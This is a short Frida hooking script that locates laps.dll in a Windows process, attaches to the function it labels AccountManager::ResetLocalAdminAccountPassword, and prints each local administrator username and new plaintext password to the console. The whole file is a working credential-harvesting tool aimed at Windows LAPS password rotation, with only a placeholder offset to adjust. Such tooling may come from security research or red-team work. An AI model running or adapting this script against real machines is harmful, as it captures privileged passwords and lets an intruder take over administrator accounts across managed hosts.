const offset = 0x13c40; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[GET] AccountManager::ResetLocalAdminAccountPassword');
            
                    const usernamePtr = args[1].add(0x18).readPointer();
                    const username = usernamePtr.readUtf16String();
                    const password = args[2].readUtf16String();
            
                    console.log(` --> Username: (${usernamePtr}) ${username} / Password: (arg[2]) ${password}`);
        },
        onLeave: function (retval) {
            // No operation
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}

